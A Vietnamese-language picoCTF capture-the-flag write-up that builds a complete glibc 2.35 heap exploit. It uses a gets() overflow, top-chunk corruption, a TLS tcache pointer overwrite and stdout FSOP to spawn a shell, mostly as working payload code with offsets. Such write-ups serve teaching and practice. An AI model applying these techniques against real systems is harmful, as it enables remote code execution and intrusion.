# high frequency troubles — picoCTF pwn write-up

## 1. Tổng quan

Challenge cung cấp một binary `hft_patched`, source `main.c`, libc `libc.so.6` và loader `ld-2.35.so`.

Kiểm tra mitigation:

```text
Arch:     amd64
RELRO:    Full RELRO
Canary:   Canary found
NX:       NX enabled
PIE:      PIE enabled
Libc:     glibc 2.35
```

Source chính khá ngắn:

```c
struct
{
    size_t sz;
    uint64_t data[];
} typedef pkt_t;

void putl(pkt_msg_t type, char *msg)
{
    printf("%s%s\x1b[m:[%s]\n", type_tbl[type].color, type_tbl[type].header, msg);
}

int main()
{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    putl(PKT_MSG_INFO, "BOOT_SQ");

    for (;;)
    {
        putl(PKT_MSG_INFO, "PKT_RES");

        size_t sz = 0;
        fread(&sz, sizeof(size_t), 1, stdin);

        pkt_t *pkt = malloc(sz);
        pkt->sz = sz;
        gets(&pkt->data);

        switch (pkt->data[0])
        {
        case PKT_OPT_PING:
            putl(PKT_MSG_DATA, "PONG_OK");
            break;
        case PKT_OPT_ECHO:
            putl(PKT_MSG_DATA, (char *)&pkt->data[1]);
            break;
        default:
            putl(PKT_MSG_INFO, "E_INVAL");
            break;
        }
    }
}
```

Chương trình cho ta nhập `sz`, sau đó gọi:

```c
pkt_t *pkt = malloc(sz);
pkt->sz = sz;
gets(&pkt->data);
```

Bug nằm ở `gets(&pkt->data)`: buffer được cấp phát theo `sz`, nhưng `gets()` đọc không giới hạn, dẫn tới **heap overflow**.

Packet layout:

```text
pkt + 0x00: pkt->sz
pkt + 0x08: pkt->data[0]  // option
pkt + 0x10: pkt->data[1]  // echo data
```

Nếu `pkt->data[0] == 1`, chương trình sẽ in chuỗi tại `&pkt->data[1]`.

## 2. Vấn đề của challenge

Challenge khó vì gần như mọi mitigation đều bật:

```text
Full RELRO  -> không overwrite GOT của binary.
PIE         -> cần leak base nếu muốn ROP binary.
NX          -> không chạy shellcode.
Canary      -> không đánh stack overflow.
No free     -> không có primitive free trực tiếp.
glibc 2.35  -> __malloc_hook / __free_hook không còn dùng được.
```

Tuy nhiên, dù chương trình không gọi `free()`, ta vẫn có thể ép glibc free top chunk bằng trick kiểu **House of Orange**.

Ý tưởng là overwrite size của top chunk thành một size nhỏ nhưng hợp lệ. Sau đó request một allocation lớn hơn top chunk giả. Khi đó `malloc()` thấy top chunk không đủ, gọi `sysmalloc()`, mở rộng heap và đưa old top chunk vào bin.

Điều kiện quan trọng của `sysmalloc()`:

```text
old_top + old_size phải page-aligned
```

Nếu không đúng, chương trình abort với lỗi:

```text
malloc.c:2617: sysmalloc: Assertion ...
```

Với request đầu là `malloc(0x10)`, ta có thể overwrite top chunk size bằng `0xd51`.

Payload:

```python
malloc(0x10, b"A" * 8 + p64(0xd51))
```

Giải thích:

```text
malloc(0x10) tạo chunk size 0x20.
gets() bắt đầu ghi tại user_ptr + 0x8.
top chunk size nằm tại user_ptr + 0x18.
=> cần ghi 8 byte option + 8 byte padding + fake top size.
```

`0xd51` có bit `PREV_INUSE`, còn phần size thật là `0xd50`, giúp:

```text
old_top + old_size == page boundary
```

Sau đó gọi:

```python
malloc(0x1000, b"")
```

Allocation này lớn hơn fake top chunk, nên glibc đi vào `sysmalloc()` và old top chunk bị đưa vào bin.

## 3. Leak heap

Sau khi top chunk bị đưa vào bin, heap đã có metadata pointer. Ta dùng nhánh `ECHO` để đọc dữ liệu còn sót.

Điểm rất quan trọng: không được gửi `p64(1)` đầy đủ khi leak, vì `gets()` sẽ append byte NULL sau option và có thể xoá mất byte đầu của pointer cần leak.

Thay vào đó, gửi ngắn:

```python
p.send(b"\x01\x00\x00\x00\x00\x00\n")
```

Như vậy:

```text
pkt->data[0] == 1
pkt->data[1] không bị overwrite
```

Code leak heap:

```python
p.recvuntil(b"PKT_RES]\n")
p.send(p64(0x8))
p.send(b"\x01\x00\x00\x00\x00\x00\n")

p.recvuntil(b"PKT_DATA\x1b[m:[")
leak = p.recvuntil(b"]\n", drop=True)

heap_leak = u64(leak.ljust(8, b"\x00"))
heap_base = heap_leak & ~0xfff
```

Kết quả dạng:

```text
heap leak = 0x55555555a2b0
heap base = 0x55555555a000
```

## 4. Fake `tcache_perthread_struct`

Sau khi có heap base, ta lợi dụng mmap allocation.

Nếu request size rất lớn, glibc sẽ dùng `mmap()` thay vì heap thường. Vùng mmap này nằm gần TLS. Trong TLS có pointer trỏ tới `tcache_perthread_struct`.

Nếu overflow từ mmap chunk tới TLS, ta có thể đổi pointer này để glibc tưởng rằng `tcache_perthread_struct` nằm ở vùng heap do ta kiểm soát.

Ta chuẩn bị fake tcache trên heap:

```python
pkt = 0x10
stri = pkt + 0x10

tcache_tls_off = 0x236f8
get_libc = -0x20

fill_h = tcache_tls_off + get_libc

libc_ptr_off = 0x560
fake_tcache_off = 0x2f0

fake_tcache_addr = heap_base + fake_tcache_off

fake_tcache  = p16(0x30) * 64
fake_tcache += p64(heap_base + libc_ptr_off)
fake_tcache += p64(fake_tcache_addr - 0x10) * 10

malloc(0x280, fake_tcache)
```

Sau đó cấp phát mmap chunk và overflow tới TLS:

```python
malloc(0x22000, b"A" * fill_h + p64(fake_tcache_addr))
```

Lúc này pointer tcache trong TLS đã bị đổi thành `fake_tcache_addr`.

Ta đã có primitive gần giống arbitrary allocation: chỉ cần sửa fake tcache entry, `malloc()` sẽ trả về địa chỉ ta muốn.

## 5. Leak libc

Ta set fake tcache entry cho size `0x20` trỏ tới vùng chứa libc pointer còn sót từ unsorted-bin metadata.

Sau đó gọi `malloc(0x10)` và leak bằng packet ngắn:

```python
p.recvuntil(b"PKT_RES]\n")
p.send(p64(0x10))
p.send(b"\x01\x00\x00\x00\x00\x00\n")

p.recvuntil(b"PKT_DATA\x1b[m:[")
leak = p.recvuntil(b"]\n", drop=True)

libc_leak = u64(leak.ljust(8, b"\x00"))
libc.address = libc_leak - 0x21a270
```

Với libc đi kèm challenge:

```text
libc leak offset = 0x21a270
```

Kết quả:

```text
libc base = 0x7ffff7c00000
```

## 6. RCE bằng FSOP trên stdout

Sau khi có libc base và fake tcache, ta có thể malloc tới gần như bất kỳ địa chỉ aligned nào.

Target ở đây là `_IO_2_1_stdout_`.

Ý tưởng:

```text
1. Fake tcache entry size 0x2e0 trỏ tới stdout - 0x10.
2. malloc(0x2d8) trả về stdout - 0x10.
3. gets() bắt đầu ghi tại returned_ptr + 0x8 = stdout - 0x8.
4. Gửi p64(0) để option là PING.
5. bytes(fake FILE) bắt đầu đúng tại stdout.
6. Sau đó putl()/printf() dùng stdout đã bị corrupt và trigger FILE chain.
```

Các symbol quan trọng:

```python
system      = libc.sym.system
stdout      = libc.sym._IO_2_1_stdout_
stdout_lock = libc.sym._IO_stdfile_1_lock
wfile_jumps = libc.sym._IO_wfile_jumps
gadget      = libc.address + 0x163850  # add rdi, 0x10 ; jmp rcx
```

Tạo fake FILE:

```python
fake = FileStructure(0)

fake.flags = 0x3b01010101010101

fake._IO_read_end  = libc.sym.system
fake._IO_save_base = libc.address + 0x163850
fake._IO_write_end = u64(b"/bin/sh\x00")

fake._lock      = libc.sym._IO_stdfile_1_lock
fake._codecvt   = libc.sym._IO_2_1_stdout_ + 0xb8
fake._wide_data = libc.sym._IO_2_1_stdout_ + 0x200

fake.unknown2 = flat(
    0, 0,
    libc.sym._IO_2_1_stdout_ + 0x20,
    0, 0, 0,
    libc.sym._IO_wfile_jumps - 0x18   # fake vtable + 0x18 (__overflow)
)

fsop_payload = p64(0) + bytes(fake)
```
 FSOP field:
- `_IO_save_base` chứa địa chỉ của một Gadget (`add rdi, 0x10; jmp rcx`). Gadget này đóng vai trò cầu nối. Khi nó được kích hoạt, thanh ghi rdi (đang trỏ tới base của FILE struct) sẽ được cộng thêm 0x10 (trỏ tới `_IO_write_end` hoặc offset chứa chuỗi).

- `_IO_write_end` (hoặc offset tương ứng sau khi `rdi + 0x10`) chứa tham số của chúng ta: "/bin/sh\x00". Lúc này rdi = "/bin/sh".

- Cùng lúc đó, trong flow của glibc, thanh ghi rcx tình cờ được nạp giá trị từ `_IO_read_end`. Do ta gán `_IO_read_end = system`, nên `jmp rcx` chính là `jmp system`   .

-> Kết quả: Gadget sẽ kích hoạt system("/bin/sh").

Sau đó sửa fake tcache:

```python
idx = 0x2c  # request 0x2d8 -> chunk size 0x2e0 -> tcache idx 0x2c

counts = bytearray(0x80)
entries = bytearray(0x200)

counts[idx * 2 : idx * 2 + 2] = p16(1)
entries[idx * 8 : idx * 8 + 8] = p64(libc.sym._IO_2_1_stdout_ - 0x10)

new_fake_tcache = bytes(counts) + bytes(entries)

malloc(0x20, new_fake_tcache)
```

Cuối cùng:

```python
p.recvuntil(b"PKT_RES]\n")
p.send(p64(0x2d8))
p.sendline(fsop_payload)

p.interactive()
```

->thành công khi remote đến server:

```text
$ ./solve.py REMOTE
[+] Opening connection to tethys.picoctf.net on port 56816: Done
[+] libc base = 0x77495e6ec000
[*] Switching to interactive mode
$
$ ls
Makefile
artifacts.tar.gz
flag.txt
hft
libc.so.6
main.c
metadata.json
profile
$ pwd
/challenge
$ id
uid=0(root) gid=0(root) groups=0(root)
```

## 7. Full exploit

**Full script nằm ở cùng thư mục này solve.py**

## 8. Kết luận

Bug ban đầu chỉ là một heap overflow do dùng `gets()`, nhưng do chương trình không có `free()`, ta phải tự tạo free primitive bằng cách corrupt top chunk size.

Chuỗi khai thác:

```text
heap overflow
-> overwrite top chunk size
-> trigger sysmalloc
-> old top chunk enters bin
-> leak heap
-> mmap overflow into TLS
-> overwrite tcache_perthread_struct pointer
-> fake tcache
-> leak libc
-> arbitrary allocation
-> overwrite stdout
-> FSOP
-> system("/bin/sh")
```

Điểm đáng học nhất của bài này là dù binary không có `free()`, ta vẫn có thể tạo heap primitive mạnh bằng top chunk corruption. Sau khi kiểm soát được `tcache_perthread_struct`, challenge chuyển từ “không làm được gì” thành gần như arbitrary allocation trên glibc 2.35.
